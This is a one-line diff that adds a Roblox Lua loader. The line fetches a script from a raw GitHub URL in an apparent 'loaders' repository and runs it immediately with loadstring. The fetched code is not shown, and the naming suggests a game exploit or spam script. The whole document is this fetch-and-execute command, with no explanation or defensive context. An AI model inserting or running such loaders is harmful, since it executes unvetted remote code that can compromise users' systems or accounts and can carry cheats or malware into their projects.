@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/peripheral-beta-spam3-of6ubh76mfqwgw.lua"))()
